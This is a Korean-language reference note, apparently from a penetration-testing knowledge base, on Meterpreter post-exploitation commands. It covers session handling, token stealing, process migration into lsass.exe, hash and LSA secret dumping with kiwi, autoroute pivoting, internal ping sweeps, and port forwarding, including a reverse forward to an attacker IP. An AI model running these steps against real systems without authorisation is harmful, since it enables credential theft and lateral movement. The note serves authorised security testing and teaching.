---
tags:
  - 기능/세션관리
  - 기능/피벗
실행환경: ["Linux"]
필요권한: ["Meterpreter 세션"]
결과: ["정보", "파일", "세션", "내부 호스트 후보", "라우트와 포트 포워딩", "권한 상승 단서"]
---

# meterpreter

## 도구 개요

Meterpreter는 Metasploit payload로 열린 세션에서 시스템·권한 정보를 조회하고 운영체제 셸 실행, 파일 전송, 프로세스 이동과 포트 포워딩을 수행하는 대화형 세션 환경이다. 일반 명령 셸보다 세션 관리와 후속 작업 기능을 한 프롬프트에서 사용할 때 유용하다.

## 필요한 입력과 실행 환경

- 실행 위치: Metasploit에서 이미 열린 Meterpreter session
- 필요한 입력: session ID와 수행할 Meterpreter command
- 환경 조건: payload의 platform/architecture와 현재 session 권한에 따라 command 및 extension 지원 범위가 달라진다.


## 표준 사용법

```text
msf6 > sessions -i <id>
meterpreter > <command>
```

## 대표 예시

### 세션 선택

```text
msf6 > sessions
msf6 > sessions -i 1
```

### 현재 권한과 시스템 정보 확인

```text
meterpreter > getuid
meterpreter > sysinfo
```

### OS 쉘로 전환

```text
meterpreter > shell
```

### 파일 업로드

```text
meterpreter > upload tool.exe C:\Windows\Temp\tool.exe
```

업로드 뒤 원격 파일 크기와 SHA-256을 확인하는 전체 절차는 [[Meterpreter upload로 Windows 파일 반입]]에서 수행한다.

### 프로세스 token 적용

```text
meterpreter > ps
meterpreter > steal_token <TARGET_PID>
meterpreter > getuid
```

### 프로세스 이동

현재 세션 프로세스가 종료되기 쉽다면 `ps`에서 같은 아키텍처의 지속 중인 프로세스를 확인하고 이동한다.

```text
meterpreter > getpid
meterpreter > ps
meterpreter > migrate <TARGET_PID>
meterpreter > getpid
meterpreter > getuid
```

`Migration completed successfully` 뒤에도 `getpid`, `getuid`와 후속 명령이 반복 실행되는지 확인한다. `migrate`는 실행 프로세스를 옮기고 `steal_token`은 다른 프로세스의 token을 적용하므로 결과를 혼동하지 않는다.

### Windows 로컬 hash와 LSA secret 확인

```text
meterpreter > getuid
meterpreter > getprivs
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```

`hashdump`가 `Operation failed: Incorrect function`으로 실패한 SYSTEM 세션에서는 `lsass.exe`의 PID·architecture·사용자를 확인하고 이동한 뒤 다시 실행한다.

```text
meterpreter > getuid
meterpreter > ps | grep lsass
meterpreter > migrate <LSASS_PID>
meterpreter > getpid
meterpreter > getuid
meterpreter > hashdump
```

`lsass.exe` 이동은 모든 Meterpreter 세션의 기본 안정화 절차가 아니다. 이 오류 분기에서는 `Migration completed successfully`, SYSTEM 유지와 실제 hash 출력을 순서대로 확인한다. `load kiwi`가 필요한 오류와 `Loaded x86 Kiwi on an x64 architecture` 경고는 별도로 구분한다.

### 내부 대역 route 추가와 확인

```text
meterpreter > background
msf6 > sessions -l
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION <SESSION_ID>
msf6 post(multi/manage/autoroute) > set CMD add
msf6 post(multi/manage/autoroute) > set SUBNET <INTERNAL_SUBNET>
msf6 post(multi/manage/autoroute) > set NETMASK <NETMASK>
msf6 post(multi/manage/autoroute) > run
msf6 > route print
```

`post/multi/manage/autoroute`는 현재 Meterpreter 세션을 gateway로 사용하는 Metasploit route를 추가한다. 서버나 세션을 재연결한 뒤에는 session ID가 달라질 수 있으므로 `sessions -l`의 현재 값을 사용하고, `route print`에서 대상 route의 gateway까지 확인한다.

`run autoroute -s <INTERNAL_CIDR>`는 레거시 스크립트 문법이다. `Meterpreter scripts are deprecated`나 `Invalid :session`이 나오면 같은 route를 바로 다시 추가하지 말고 `route print`를 먼저 확인한다. route가 현재 session에 연결되어 있으면 기능 검증을 진행하고, 없거나 이전 session을 가리킬 때만 post 모듈로 재구성한다.

### 세션 호스트에서 내부 대역 ping sweep

```text
meterpreter > run post/multi/gather/ping_sweep RHOSTS=<INTERNAL_CIDR>
```

이 명령은 Meterpreter 프롬프트에서 시작하지만 ICMP 요청은 세션이 열린 호스트에서 `<INTERNAL_CIDR>`로 전송한다. `Performing ping sweep for IP range`는 실행 시작이며, 응답이 없으면 ICMP 차단·route·세션 권한을 구분해야 한다.

### 단일 내부 포트의 로컬 포워딩

```text
meterpreter > portfwd add -l <LOCAL_PORT> -p <INTERNAL_PORT> -r <INTERNAL_IP>
meterpreter > portfwd list
```

### 피벗 호스트에서 공격 호스트로 역방향 포워딩

```text
meterpreter > portfwd add -R -l <ATTACKER_LISTENER_PORT> -p <PIVOT_LISTEN_PORT> -L <ATTACKER_IP>
meterpreter > portfwd list
```

`-R` 방식은 피벗 호스트의 `<PIVOT_LISTEN_PORT>`로 들어온 연결을 공격 호스트의 `<ATTACKER_IP>:<ATTACKER_LISTENER_PORT>`로 전달한다. 포워딩 생성과 실제 listener·payload session 획득은 따로 확인한다.

## 주요 옵션과 명령

| 명령 | 설명 |
| --- | --- |
| `getuid`, `sysinfo` | 현재 권한과 시스템 정보 확인 |
| `shell` | OS 쉘 실행 |
| `upload`, `download` | 파일 전송 |
| `ps`, `migrate` | 프로세스 확인과 세션 이동 |
| `steal_token <PID>` | 지정한 Windows 프로세스의 token을 현재 세션에 적용 |
| `hashdump` | Windows hash dump 시도 |
| `load kiwi` | kiwi 확장 로드 |
| `lsa_dump_sam`, `lsa_dump_secrets` | SAM 계정 hash와 LSA secret 조회 |
| `portfwd` | 포트 포워딩 설정 |
| `run post/multi/gather/ping_sweep RHOSTS=<INTERNAL_CIDR>` | 세션 호스트에서 대상 CIDR로 ICMP sweep 실행 |
| `portfwd add -l <LOCAL_PORT> -p <INTERNAL_PORT> -r <INTERNAL_IP>` | 공격 호스트 로컬 포트를 세션 호스트가 도달하는 내부 TCP 포트로 전달 |
| `portfwd add -R -l <ATTACKER_LISTENER_PORT> -p <PIVOT_LISTEN_PORT> -L <ATTACKER_IP>` | 피벗 호스트의 수신 포트를 공격 호스트 listener로 역방향 전달 |
| `portfwd list` | 현재 세션의 포워딩 항목 확인 |
| `run autoroute -s <INTERNAL_CIDR>` | 현재 세션을 gateway로 사용하는 Metasploit route 추가. 레거시 문법이므로 deprecation 경고와 실제 추가 결과를 구분 |
| `run autoroute -p` | Meterpreter autoroute 스크립트가 인식하는 활성 route 목록 확인 |
| `background` | 세션을 백그라운드로 전환 |


## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| `meterpreter >` 프롬프트 | Meterpreter 세션 획득 | `getuid`, `sysinfo`, `pwd`, `ipconfig/ifconfig` 확인 |
| 명령 실행/파일 전송 성공 | 세션 조작 가능 | 필요한 파일 회수, 권한 상승, 피벗 가능성 확인 |
| 세션이 자주 죽음 | payload 안정성 또는 AV/EDR 영향 | 일반 shell 전환, 다른 payload, 실행 위치 확인 |
| 권한 부족 | 현재 사용자 권한 제한 | `getprivs`, local exploit, credential 수집 방향 검토 |
| `Stolen token with username` | 지정한 프로세스 token이 세션에 적용됨 | `getuid`와 실제 자원 접근으로 권한 확인 |
| `Migration completed successfully` | Meterpreter payload가 대상 PID의 프로세스로 이동함 | 이동 뒤 `getpid`, `getuid`, `getprivs`와 세션 생존 확인 |
| `Operation failed: Incorrect function` | `hashdump`가 현재 세션 권한·architecture·프로세스 조건에서 실패 | SYSTEM 여부를 확인하고 `ps | grep lsass`에서 호환되는 `lsass.exe` PID를 찾은 뒤 이동·재시도 |
| kiwi 확장 필요 오류 | `lsa_dump_sam`·`lsa_dump_secrets` 실행 전 kiwi가 로드되지 않음 | `load kiwi` 뒤 architecture 경고와 실행 결과 확인 |
| 파일 전송 실패 | 경로/권한 문제 | 쓰기 가능한 디렉터리, AV 차단, 파일명 확인 |
| `[+] Added route to <SUBNET>/<NETMASK> via <SESSION_HOST>` | 지정한 내부 대역이 현재 세션을 경유하도록 Metasploit route에 추가됨 | `run autoroute -p` 또는 Metasploit console의 `route print`로 CIDR과 session 확인 |
| `Meterpreter scripts are deprecated` | 레거시 autoroute 스크립트 사용 경고이며 route 생성 성공 자체를 뜻하지 않음 | 이어지는 `[+] Added route`를 확인하거나 `post/multi/manage/autoroute` 사용 |
| `ArgumentError Invalid :session, expected Session object` | 레거시 route 처리와 현재 session 등록 정보가 맞지 않음. route가 먼저 추가됐을 수도 있음 | `sessions -l`과 `route print`를 대조하고, route가 없거나 이전 session을 가리킬 때만 post 모듈로 재구성 |
| `Performing ping sweep for IP range <CIDR>` | 세션 호스트에서 ICMP sweep 시작 | 응답 주소를 확인하고 결과가 비면 단일 ping·route·ICMP 차단을 구분 |
| `Local TCP relay created` | 지정한 portfwd relay가 생성됨 | `portfwd list`와 실제 로컬 또는 역방향 연결로 전달 확인 |
| 피벗 실패 | route/session 지정 오류 | `route print`, `autoroute`, session id 확인 |

## 관련 공격기법

- [[Meterpreter 세션 후속 행동]]
- [[Meterpreter upload로 Windows 파일 반입]]
- [[Meterpreter 라우팅과 포트 포워딩]]
- [[ICMP 기반 내부 호스트 확인]]
- [[Meterpreter 프로세스 토큰 탈취]]
- [[Meterpreter 프로세스 이동과 세션 안정화]]
- [[Windows SAM SECURITY SYSTEM 덤프]]
